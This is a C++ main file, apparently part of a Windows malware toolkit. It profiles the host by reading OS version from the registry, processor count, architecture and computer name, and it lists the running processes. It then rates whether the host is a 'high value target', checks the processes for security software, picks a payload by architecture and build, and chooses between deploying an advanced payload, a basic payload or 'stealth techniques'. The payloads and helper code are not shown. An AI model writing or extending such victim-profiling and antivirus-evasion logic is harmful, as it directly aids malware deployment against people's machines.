#include "utilities.hpp"
#include "targetassessment.hpp"

int main()
{
    UTILITIES utils;
    TargetAssessment assessment;

    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);

    std::string architecture = utils.GetArchitectureString(systemInfo);
    std::vector<std::string> processNames = utils.GetProcessNames();
    std::string computerName = utils.GetComputerName();
    std::string productName = utils.GetRegistryValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
    std::string buildNumber = utils.GetRegistryValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentBuild");
    std::string releaseId = utils.GetRegistryValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId");

    std::string sysInfo = "=== SYSTEM INFORMATION ===\n";
    sysInfo += "OS: " + productName + "\n";
    sysInfo += "Build: " + buildNumber + "\n";
    sysInfo += "Release: " + releaseId + "\n";
    sysInfo += "Processors: " + std::to_string(systemInfo.dwNumberOfProcessors) + "\n";
    sysInfo += "Architecture: " + architecture + "\n";
    sysInfo += "Computer Name: " + computerName + "\n";

    std::string processInfo = utils.EnumerateProcesses();

    bool highValue = assessment.isHighValueTarget(computerName, systemInfo.dwNumberOfProcessors);
    bool securityDetected = assessment.detectSecuritySoftware(processNames);
    std::string payload = assessment.selectPayload(architecture, buildNumber);

    std::string analysisResult = "\n=== TARGET ANALYSIS ===\n";
    analysisResult += "Target Value: " + std::string(highValue ? "HIGH" : "LOW") + "\n";
    analysisResult += "Recommended Payload: " + payload + "\n";
    analysisResult += "Security Software: " + std::string(securityDetected ? "DETECTED" : "NONE") + "\n";

    if (highValue && !securityDetected) {
        analysisResult += "Action: DEPLOY ADVANCED PAYLOAD\n";
    }
    else if (securityDetected) {
        analysisResult += "Action: USE STEALTH TECHNIQUES\n";
    }
    else {
        analysisResult += "Action: DEPLOY BASIC PAYLOAD\n";
    }

    std::cout << sysInfo << "\n" << processInfo << analysisResult;
    utils.SaveToFile(sysInfo + analysisResult, processInfo);

    return 0;
}